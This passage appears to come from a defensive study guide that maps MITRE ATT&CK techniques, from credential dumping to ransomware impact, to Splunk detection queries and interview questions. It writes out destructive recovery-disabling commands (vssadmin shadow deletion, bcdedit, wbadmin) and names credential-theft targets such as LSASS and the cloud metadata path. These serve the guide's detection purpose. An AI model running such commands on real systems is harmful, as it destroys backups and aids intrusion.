├── T1056.002: GUI Input Capture
├── T1056.003: Web Portal Capture
└── T1056.004: Credential API Hooking

MODIFY AUTHENTICATION PROCESS (T1556) [also Persistence]

MULTI-FACTOR AUTHENTICATION INTERCEPTION (T1111):
└── Techniques: SIM swapping, SS7 interception, MFA fatigue

MULTI-FACTOR AUTHENTICATION REQUEST GENERATION (T1621):
├── MFA Fatigue/Bombing: Send repeated push notifications
└── Detection: Unusual MFA request volume

NETWORK SNIFFING (T1040):
└── Detection: Promiscuous mode on interfaces

OS CREDENTIAL DUMPING (T1003):
├── T1003.001: LSASS Memory
│   ├── Tools: Mimikatz, procdump, comsvcs.dll
│   ├── Events: Sysmon 10 (ProcessAccess to lsass.exe)
│   └── Splunk:
│       index=sysmon EventCode=10 TargetImage="*\\lsass.exe"
│       | where NOT SourceImage IN ("*\\csrss.exe","*\\wininit.exe",
│           "*\\MsMpEng.exe","*\\svchost.exe")
│       | stats count by SourceImage, SourceUser, GrantedAccess
│
├── T1003.002: Security Account Manager (SAM)
│   └── Location: C:\Windows\System32\config\SAM
│
├── T1003.003: NTDS
│   ├── Methods: ntdsutil, vssadmin, wmic shadowcopy
│   └── Events: 4799 (AD snapshot)
│
├── T1003.004: LSA Secrets
├── T1003.005: Cached Domain Credentials
├── T1003.006: DCSync
│   ├── Rights needed: Replicating Directory Changes
│   ├── Events: 4662 with replication GUIDs
│   └── Splunk:
│       index=windows EventCode=4662
│       | where Properties="*1131f6ad-*" OR Properties="*1131f6aa-*"
│       | where NOT AccountName IN ("DC$", "SYSTEM")
│
├── T1003.007: Proc Filesystem (Linux)
└── T1003.008: /etc/passwd and /etc/shadow

STEAL APPLICATION ACCESS TOKEN (T1528):
└── Targets: OAuth tokens, API keys

STEAL OR FORGE AUTHENTICATION CERTIFICATES (T1649):
├── ADCS abuse (ESC1-ESC8)
├── Tools: Certify, Certipy
└── Detection: Certificate request anomalies

STEAL OR FORGE KERBEROS TICKETS (T1558):
├── T1558.001: Golden Ticket
│   ├── Requires: KRBTGT hash
│   ├── Duration: Default 10 years
│   └── Detection: TGT lifetime anomaly, SID mismatch
│
├── T1558.002: Silver Ticket
│   ├── Requires: Service account hash
│   └── Detection: Service ticket without TGT request
│
├── T1558.003: Kerberoasting
│   ├── Events: 4769 with RC4 encryption (0x17)
│   └── Splunk:
│       index=windows EventCode=4769 TicketEncryptionType="0x17"
│       | stats dc(ServiceName) as services_requested by TargetUserName, IpAddress
│       | where services_requested > 5
│
└── T1558.004: AS-REP Roasting
    ├── Target: Accounts with "Do not require preauth"
    └── Events: 4768 with PreAuthType=0

STEAL WEB SESSION COOKIE (T1539):
└── Methods: Browser storage access, MitM

UNSECURED CREDENTIALS (T1552):
├── T1552.001: Credentials in Files
│   └── Locations: config files, scripts, .env
├── T1552.002: Credentials in Registry
├── T1552.003: Bash History
├── T1552.004: Private Keys
│   └── Locations: .ssh/, .pem files
├── T1552.005: Cloud Instance Metadata API
│   ├── AWS: 169.254.169.254/latest/meta-data/iam/security-credentials/
│   └── Detection: SSRF protection, IMDSv2
├── T1552.006: Group Policy Preferences
│   └── Location: SYSVOL\Policies\*.xml (cpassword)
├── T1552.007: Container API
└── T1552.008: Chat Messages
```

---

## TA0007: Discovery

```
ACCOUNT DISCOVERY (T1087):
├── T1087.001: Local Account
│   └── Commands: net user, Get-LocalUser
├── T1087.002: Domain Account
│   └── Commands: net user /domain, Get-ADUser
├── T1087.003: Email Account
├── T1087.004: Cloud Account
│   └── Commands: aws iam list-users, Get-AzADUser
└── Detection:
    index=sysmon EventCode=1
    | where CommandLine="*net user*" OR CommandLine="*Get-ADUser*"

BROWSER INFORMATION DISCOVERY (T1217):
└── Targets: History, bookmarks, saved passwords

CLOUD INFRASTRUCTURE DISCOVERY (T1580):
├── AWS: describe-instances, list-buckets
├── Azure: Get-AzVM, Get-AzStorageAccount
└── GCP: gcloud compute instances list

CLOUD SERVICE DASHBOARD (T1538):

CLOUD SERVICE DISCOVERY (T1526):

CLOUD STORAGE OBJECT DISCOVERY (T1619):
└── Commands: aws s3 ls, Get-AzStorageBlob

CONTAINER AND RESOURCE DISCOVERY (T1613):
├── Commands: kubectl get pods, docker ps
└── Detection: Unusual kubectl commands

DEBUGGER EVASION (T1622):

DEVICE DRIVER DISCOVERY (T1652):

DOMAIN TRUST DISCOVERY (T1482):
└── Commands: nltest /domain_trusts, Get-ADTrust

FILE AND DIRECTORY DISCOVERY (T1083):
└── Commands: dir, ls, find, Get-ChildItem

GROUP POLICY DISCOVERY (T1615):
└── Commands: gpresult, Get-GPO

NETWORK SERVICE DISCOVERY (T1046):
├── Tools: nmap, masscan, netcat
└── Detection: Port scanning patterns

NETWORK SHARE DISCOVERY (T1135):
└── Commands: net share, net view

NETWORK SNIFFING (T1040) [also Credential Access]

PASSWORD POLICY DISCOVERY (T1201):
└── Commands: net accounts, Get-ADDefaultDomainPasswordPolicy

PERIPHERAL DEVICE DISCOVERY (T1120):

PERMISSION GROUPS DISCOVERY (T1069):
├── T1069.001: Local Groups
├── T1069.002: Domain Groups
│   └── Tools: BloodHound, AdFind, net group /domain
└── T1069.003: Cloud Groups

PROCESS DISCOVERY (T1057):
└── Commands: tasklist, ps, Get-Process

QUERY REGISTRY (T1012):
└── Commands: reg query, Get-ItemProperty

REMOTE SYSTEM DISCOVERY (T1018):
├── Commands: net view, ping sweep, nslookup
└── Tools: BloodHound, AdFind

SOFTWARE DISCOVERY (T1518):
├── T1518.001: Security Software Discovery
└── Commands: wmic product get, Get-WmiObject Win32_Product

SYSTEM INFORMATION DISCOVERY (T1082):
└── Commands: systeminfo, uname -a, hostname

SYSTEM LOCATION DISCOVERY (T1614):
├── T1614.001: System Language Discovery
└── Purpose: Detect sandbox, target specific regions

SYSTEM NETWORK CONFIGURATION DISCOVERY (T1016):
├── T1016.001: Internet Connection Discovery
└── Commands: ipconfig, ifconfig, route print

SYSTEM NETWORK CONNECTIONS DISCOVERY (T1049):
└── Commands: netstat, ss, Get-NetTCPConnection

SYSTEM OWNER/USER DISCOVERY (T1033):
└── Commands: whoami, id, query user

SYSTEM SERVICE DISCOVERY (T1007):
└── Commands: sc query, systemctl list-units

SYSTEM TIME DISCOVERY (T1124):

VIRTUALIZATION/SANDBOX EVASION (T1497) [also Defense Evasion]
```

---

## TA0008: Lateral Movement

```
EXPLOITATION OF REMOTE SERVICES (T1210):
├── Examples: EternalBlue (MS17-010), BlueKeep (CVE-2019-0708)
└── Detection: Exploit signatures, unusual service crashes

INTERNAL SPEARPHISHING (T1534):
└── Mechanism: Phishing from compromised internal account

LATERAL TOOL TRANSFER (T1570):
├── Methods: SMB, admin shares, SCP, FTP
└── Detection:
    index=sysmon EventCode=11
    | where TargetFilename="*\\C$\\*" OR TargetFilename="*\\ADMIN$\\*"
    | where match(TargetFilename, "\\.(exe|dll|ps1|bat)$")

REMOTE SERVICE SESSION HIJACKING (T1563):
├── T1563.001: SSH Hijacking
├── T1563.002: RDP Hijacking
│   └── Commands: tscon, query session
└── Detection: Session disconnect/reconnect patterns

REMOTE SERVICES (T1021):
├── T1021.001: Remote Desktop Protocol
│   ├── Events: 4624 Type 10, 4778/4779
│   └── Detection: RDP from unusual sources
│
├── T1021.002: SMB/Windows Admin Shares
│   ├── Shares: C$, ADMIN$, IPC$
│   ├── Events: 5140 (share access), 5145 (detailed)
│   └── Detection:
│       index=windows EventCode=5140
│       | where ShareName IN ("\\\\*\\C$","\\\\*\\ADMIN$")
│       | stats count by SubjectUserName, IpAddress, ShareName
│
├── T1021.003: Distributed Component Object Model (DCOM)
│   ├── Objects: MMC20.Application, ShellWindows, ShellBrowserWindow
│   └── Detection: DCOMActivation events
│
├── T1021.004: SSH
├── T1021.005: VNC
├── T1021.006: Windows Remote Management (WinRM)
│   ├── Commands: winrs, Enter-PSSession, Invoke-Command
│   ├── Events: 4624 Type 3 + 4103/4104
│   └── Detection:
│       index=windows EventCode=4624 LogonType=3
│       | where AuthenticationPackageName="Negotiate"
│       | lookup privileged_users TargetUserName OUTPUT is_admin
│       | where is_admin="yes"
│
└── T1021.007: Cloud Services

REPLICATION THROUGH REMOVABLE MEDIA (T1091):

SOFTWARE DEPLOYMENT TOOLS (T1072) [also Execution]:
├── Tools: SCCM, PDQ Deploy, Puppet, Chef, Ansible
└── Detection: Baseline deployment patterns

TAINT SHARED CONTENT (T1080):
└── Mechanism: Backdoor files in shared folders

USE ALTERNATE AUTHENTICATION MATERIAL (T1550) [also Defense Evasion]
```

---

## TA0009: Collection

```
ADVERSARY-IN-THE-MIDDLE (T1557) [also Credential Access]

ARCHIVE COLLECTED DATA (T1560):
├── T1560.001: Archive via Utility
│   └── Tools: 7z, WinRAR, tar, zip
├── T1560.002: Archive via Library
└── T1560.003: Archive via Custom Method
└── Detection:
    index=sysmon EventCode=1
    | where Image IN ("*\\7z.exe","*\\rar.exe","*\\zip.exe")
    | where CommandLine="*-p*" OR CommandLine="*password*"

AUDIO CAPTURE (T1123):

AUTOMATED COLLECTION (T1119):

BROWSER SESSION HIJACKING (T1185):

CLIPBOARD DATA (T1115):

DATA FROM CLOUD STORAGE (T1530):
└── Commands: aws s3 cp, gsutil cp, azcopy

DATA FROM CONFIGURATION REPOSITORY (T1602):
├── T1602.001: SNMP (MIB Dump)
└── T1602.002: Network Device Configuration Dump

DATA FROM INFORMATION REPOSITORIES (T1213):
├── T1213.001: Confluence
├── T1213.002: Sharepoint
├── T1213.003: Code Repositories
└── Detection: Unusual bulk downloads

DATA FROM LOCAL SYSTEM (T1005):
└── Targets: Documents, desktop, downloads

DATA FROM NETWORK SHARED DRIVE (T1039):

DATA FROM REMOVABLE MEDIA (T1025):

DATA STAGED (T1074):
├── T1074.001: Local Data Staging
│   └── Locations: %TEMP%, %APPDATA%, C:\Users\Public
├── T1074.002: Remote Data Staging
└── Detection:
    index=sysmon EventCode=11
    | where TargetFilename="*\\Temp\\*.zip" OR
            TargetFilename="*\\Temp\\*.rar" OR
            TargetFilename="*\\Temp\\*.7z"
    | stats count by Computer, User, TargetFilename

EMAIL COLLECTION (T1114):
├── T1114.001: Local Email Collection
├── T1114.002: Remote Email Collection
│   └── Methods: OWA, EWS, Graph API
└── T1114.003: Email Forwarding Rule

INPUT CAPTURE (T1056) [also Credential Access]

SCREEN CAPTURE (T1113):

VIDEO CAPTURE (T1125):
```

---

## TA0011: Command and Control

```
APPLICATION LAYER PROTOCOL (T1071):
├── T1071.001: Web Protocols (HTTP/HTTPS)
│   ├── Indicators: Beaconing, unusual user-agents
│   └── Detection:
│       index=proxy
│       | bucket span=5m _time
│       | stats count by src_ip, dest_domain
│       | eventstats stdev(count) as stdev by src_ip, dest_domain
│       | where stdev < 2  /* Regular intervals */
│
├── T1071.002: File Transfer Protocols (FTP, SFTP)
├── T1071.003: Mail Protocols (SMTP, IMAP, POP3)
└── T1071.004: DNS
    └── Detection: Long DNS queries, high volume to single domain

COMMUNICATION THROUGH REMOVABLE MEDIA (T1092):

DATA ENCODING (T1132):
├── T1132.001: Standard Encoding (Base64)
└── T1132.002: Non-Standard Encoding

DATA OBFUSCATION (T1001):
├── T1001.001: Junk Data
├── T1001.002: Steganography
└── T1001.003: Protocol Impersonation

DYNAMIC RESOLUTION (T1568):
├── T1568.001: Fast Flux DNS
├── T1568.002: Domain Generation Algorithms (DGA)
│   └── Detection: High NXDomain, entropy analysis
└── T1568.003: DNS Calculation

ENCRYPTED CHANNEL (T1573):
├── T1573.001: Symmetric Cryptography
├── T1573.002: Asymmetric Cryptography
└── Detection: JA3/JA3S fingerprinting, certificate analysis

FALLBACK CHANNELS (T1008):

INGRESS TOOL TRANSFER (T1105):
├── Methods: certutil, bitsadmin, PowerShell, curl, wget
└── Detection: Download utilities with URLs

MULTI-STAGE CHANNELS (T1104):

NON-APPLICATION LAYER PROTOCOL (T1095):
└── Protocols: ICMP, DNS over UDP

NON-STANDARD PORT (T1571):
└── Detection: HTTP on non-80/443, HTTPS on 8080

PROTOCOL TUNNELING (T1572):
├── Methods: DNS tunneling, HTTP tunneling, SSH tunneling
└── Tools: dnscat2, Chisel, ngrok

PROXY (T1090):
├── T1090.001: Internal Proxy
├── T1090.002: External Proxy
├── T1090.003: Multi-hop Proxy
└── T1090.004: Domain Fronting
    └── Detection: Host header mismatch, SNI vs certificate

REMOTE ACCESS SOFTWARE (T1219):
├── Tools: TeamViewer, AnyDesk, LogMeIn, ScreenConnect
└── Detection: Known remote access software signatures

TRAFFIC SIGNALING (T1205) [also Persistence]

WEB SERVICE (T1102):
├── T1102.001: Dead Drop Resolver
├── T1102.002: Bidirectional Communication
├── T1102.003: One-Way Communication
└── Platforms: Pastebin, GitHub, Twitter, Slack, Discord
```

---

## TA0010: Exfiltration

```
AUTOMATED EXFILTRATION (T1020):
├── T1020.001: Traffic Duplication
└── Detection: Unusual data transfer volumes

DATA TRANSFER SIZE LIMITS (T1030):
└── Purpose: Avoid detection by breaking into small chunks

EXFILTRATION OVER ALTERNATIVE PROTOCOL (T1048):
├── T1048.001: Exfiltration Over Symmetric Encrypted Non-C2 Protocol
├── T1048.002: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
├── T1048.003: Exfiltration Over Unencrypted Non-C2 Protocol
└── Methods: DNS, ICMP, SMTP

EXFILTRATION OVER C2 CHANNEL (T1041):

EXFILTRATION OVER OTHER NETWORK MEDIUM (T1011):
├── T1011.001: Exfiltration Over Bluetooth
└── Detection: Unusual network interface usage

EXFILTRATION OVER PHYSICAL MEDIUM (T1052):
├── T1052.001: Exfiltration Over USB
└── Detection: USB storage device connections

EXFILTRATION OVER WEB SERVICE (T1567):
├── T1567.001: Exfiltration to Code Repository
├── T1567.002: Exfiltration to Cloud Storage
│   └── Services: Dropbox, Google Drive, OneDrive, AWS S3
├── T1567.003: Exfiltration to Text Storage Sites
├── T1567.004: Exfiltration Over Webhook
└── Detection:
    index=proxy dest_domain IN ("dropbox.com","drive.google.com",
        "onedrive.live.com","*.s3.amazonaws.com")
    | where http_method="POST" OR http_method="PUT"
    | stats sum(bytes_out) as total_bytes by src_ip, dest_domain
    | where total_bytes > 100000000

SCHEDULED TRANSFER (T1029):
└── Purpose: Blend with normal traffic patterns

TRANSFER DATA TO CLOUD ACCOUNT (T1537):
└── Mechanism: Move data between cloud accounts
```

---

## TA0040: Impact

```
ACCOUNT ACCESS REMOVAL (T1531):
└── Methods: Password change, disable account

DATA DESTRUCTION (T1485):
└── Examples: Wipers (WhisperGate, HermeticWiper)

DATA ENCRYPTED FOR IMPACT (T1486):
├── Ransomware families: LockBit, BlackCat, Cl0p, Play
└── Detection: Mass file modification, extension changes

DATA MANIPULATION (T1565):
├── T1565.001: Stored Data Manipulation
├── T1565.002: Transmitted Data Manipulation
└── T1565.003: Runtime Data Manipulation

DEFACEMENT (T1491):
├── T1491.001: Internal Defacement
└── T1491.002: External Defacement

DISK WIPE (T1561):
├── T1561.001: Disk Content Wipe
└── T1561.002: Disk Structure Wipe

ENDPOINT DENIAL OF SERVICE (T1499):
├── T1499.001: OS Exhaustion Flood
├── T1499.002: Service Exhaustion Flood
├── T1499.003: Application Exhaustion Flood
└── T1499.004: Application or System Exploitation

FINANCIAL THEFT (T1657):

FIRMWARE CORRUPTION (T1495):

INHIBIT SYSTEM RECOVERY (T1490):
├── Commands:
│   ├── vssadmin delete shadows /all /quiet
│   ├── wmic shadowcopy delete
│   ├── bcdedit /set {default} recoveryenabled No
│   ├── wbadmin delete catalog -quiet
│   └── bcdedit /set {default} bootstatuspolicy ignoreallfailures
├── Events: Sysmon 1 (process creation)
└── Splunk:
    index=sysmon EventCode=1
    | where match(CommandLine, "(?i)(vssadmin.*delete|wbadmin.*delete|
        bcdedit.*recovery|shadowcopy.*delete)")
    | stats count values(CommandLine) by User, Computer

NETWORK DENIAL OF SERVICE (T1498):
├── T1498.001: Direct Network Flood
└── T1498.002: Reflection Amplification

RESOURCE HIJACKING (T1496):
└── Examples: Cryptomining

SERVICE STOP (T1489):
├── Commands: sc stop, Stop-Service, systemctl stop
└── Targets: Security services, backup services

SYSTEM SHUTDOWN/REBOOT (T1529):
└── Commands: shutdown, reboot
```

---

## Detection Priority Matrix

```
CRITICAL (Detect within 15 min):
├── T1003.001 - LSASS Memory Dumping
├── T1003.006 - DCSync
├── T1486 - Ransomware Encryption
├── T1490 - Inhibit System Recovery
├── T1558.001 - Golden Ticket
├── T1562.001 - Disable Security Tools
└── T1078.002 - Domain Account Compromise

HIGH (Detect within 1 hour):
├── T1059.001 - Malicious PowerShell
├── T1055 - Process Injection
├── T1021 - Remote Services (Lateral Movement)
├── T1543.003 - Malicious Service Creation
├── T1053.005 - Suspicious Scheduled Tasks
├── T1505.003 - Web Shells
└── T1547.001 - Run Key Persistence

MEDIUM (Detect within 4 hours):
├── T1087 - Account Discovery
├── T1082 - System Information Discovery
├── T1083 - File and Directory Discovery
├── T1057 - Process Discovery
├── T1018 - Remote System Discovery
└── T1069 - Permission Groups Discovery

Coverage Target: >80% of Critical/High techniques with validated detections
```

---

## Interview Questions - MITRE ATT&CK

1. **How do you prioritize detection development using ATT&CK?**
   - Threat intel: What's targeting our industry?
   - Crown jewels: What protects critical assets?
   - Gap analysis: What can't we detect today?
   - Prevalence: What's commonly used by adversaries?

2. **Explain the difference between techniques and sub-techniques**
   - Technique: General method (T1055 - Process Injection)
   - Sub-technique: Specific implementation (T1055.012 - Process Hollowing)
   - Detection may differ between sub-techniques

3. **How would you detect Kerberoasting?**
   - Event 4769 with RC4 encryption (0x17)
   - Single user requesting many TGS tickets
   - Service accounts with SPNs
   - Correlation with follow-up password cracking indicators

4. **Walk through detecting a ransomware attack using ATT&CK**
   - Initial Access: Phishing detection (T1566)
   - Execution: Macro/script execution (T1059)
   - Persistence: Service/scheduled task (T1543, T1053)
   - Discovery: Account/network enumeration (T1087, T1018)
   - Lateral Movement: RDP/SMB (T1021)
   - Collection: Archive creation (T1560)
   - Impact: Shadow deletion (T1490), Encryption (T1486)

---

**Next: [05_DETECTION_ENGINEERING.md](./05_DETECTION_ENGINEERING.md) →**
